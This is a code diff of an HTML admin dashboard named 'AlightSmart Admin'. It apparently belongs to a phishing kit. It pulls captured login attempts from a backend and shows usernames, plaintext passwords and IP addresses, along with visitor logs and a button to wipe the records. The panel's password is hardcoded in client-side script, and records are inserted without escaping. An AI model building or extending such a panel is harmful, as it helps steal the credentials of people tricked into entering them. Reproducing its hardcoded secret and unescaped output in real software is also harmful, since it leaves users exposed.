@@ -5,46 +5,108 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AlightSmart Admin</title>
     <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; border: 1px solid #ccc; text-align: left; }
-        th { background: #1e40af; color: white; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
+        .section { margin: 25px; }
+        h2 { color: #1e40af; margin-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #e2e8f0; }
+        .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>AlightSmart Admin Dashboard</h1>
-    <p>Password: tunde6035</p>
-    <table id="table">
-        <thead>
-            <tr>
-                <th>Time</th>
-                <th>Type</th>
-                <th>Username</th>
-                <th>Password</th>
-                <th>IP</th>
-            </tr>
-        </thead>
-        <tbody></tbody>
-    </table>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 AlightSmart Admin Dashboard</h1>
+            <p>Secure Access</p>
+        </div>
+
+        <!-- Section 1: Login Records -->
+        <div class="section">
+            <h2>1. Login Records (Username & Password)</h2>
+            <table id="loginTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Username / Email</th>
+                        <th>Password</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+
+        <!-- Section 2: Page Visits -->
+        <div class="section">
+            <h2>2. Page Visits (Before Login)</h2>
+            <table id="visitTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Type</th>
+                        <th>IP Address</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+
+        <button class="clear-btn" onclick="clearRecords()">Clear All Records</button>
+    </div>
 
     <script>
+        const ADMIN_PASSWORD = "tunde6035";
+
         async function loadRecords() {
             const res = await fetch('/api/records');
             const records = await res.json();
-            const tbody = document.querySelector('#table tbody');
-            tbody.innerHTML = "";
+
+            const loginBody = document.querySelector('#loginTable tbody');
+            const visitBody = document.querySelector('#visitTable tbody');
+            loginBody.innerHTML = "";
+            visitBody.innerHTML = "";
+
             records.forEach(r => {
-                tbody.innerHTML += `<tr>
-                    <td>${r.timestamp}</td>
-                    <td>${r.type}</td>
-                    <td>${r.username || '-'}</td>
-                    <td>${r.password ? r.password : '-'}</td>
-                    <td>${r.ip}</td>
-                </tr>`;
+                if (r.type === "Login Attempt") {
+                    loginBody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp}</td>
+                            <td><strong>${r.username || '-'}</strong></td>
+                            <td><code>${r.password}</code></td>
+                            <td>${r.ip || '-'}</td>
+                        </tr>`;
+                } else {
+                    visitBody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp}</td>
+                            <td>${r.type}</td>
+                            <td>${r.ip || '-'}</td>
+                        </tr>`;
+                }
             });
         }
-        setInterval(loadRecords, 3000);
-        window.onload = loadRecords;
+
+        window.onload = () => {
+            const pass = prompt("Enter Admin Password:");
+            if (pass === ADMIN_PASSWORD) {
+                loadRecords();
+                setInterval(loadRecords, 3000);
+            } else {
+                alert("❌ Wrong Password");
+                window.location.href = "/";
+            }
+        };
+
+        async function clearRecords() {
+            if (confirm("Clear all records?")) {
+                await fetch('/api/clear', { method: 'POST' });
+                loadRecords();
+            }
+        }
     </script>
 </body>
 </html>
